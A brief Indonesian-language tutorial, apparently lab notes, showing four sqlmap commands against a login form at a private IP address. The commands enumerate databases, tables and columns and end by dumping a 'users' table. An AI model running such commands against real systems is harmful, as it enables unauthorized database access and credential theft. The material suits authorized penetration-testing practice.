# sqlmap show database tabel colum #

1.Temukan Struktur Database:

````
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 --dbs
````
2.Temukan Struktur tabel:
 dengan di masukanya nama dataBase (-D testdb) + --tables
````
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 -D testdb --tables
````
3.Temukan  isi structur tabel :
 dengan menambahakanya nama tabel (-D testdb -T users ) + --columns
````
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 -D testdb -T users --columns
````
4..Temukan Struktur isi columns:
  dengan menambahakan peruintah (--dump)  
````
sqlmap -u "http://192.168.1.2/pe/index.php" --data="username=admin&password=admin" --batch --risk=3 --level=5 -D testdb -T users --dump       

````

